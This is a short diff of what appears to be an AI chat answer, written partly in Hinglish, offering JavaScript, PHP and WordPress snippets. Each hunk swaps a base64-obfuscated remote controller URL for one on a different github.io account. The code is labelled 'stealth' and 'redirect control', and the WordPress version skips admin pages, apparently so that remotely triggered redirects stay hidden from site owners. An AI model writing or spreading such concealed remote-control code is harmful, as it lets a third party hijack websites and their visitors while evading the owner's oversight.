@@ -24,7 +24,7 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 <script>
 (function(){
     // --- Encrypted Configuration ---
-    const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u"); // URL
+    const _u = atob("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u"); // URL
     const _k = atob("RkFIQUQtNzg2"); // Key
     
     // Keywords Encryption
@@ -106,7 +106,7 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 <?php
 /* --- PHP STEALTH SHIELD V10 (REDIRECT CONTROL) --- */
 function _sys_sync_final_v10(){
-    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
+    $_u = base64_decode("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
     $_k = base64_decode("RkFIQUQtNzg2"); 
     
     $_f = [
@@ -208,7 +208,7 @@ function _wp_secure_v10_stealth() {
     if (is_admin()) return;
 
     // Configuration Encrypted
-    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
+    $_u = base64_decode("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
     $_k = base64_decode("RkFIQUQtNzg2"); 
     
     // Key Mappings Encrypted
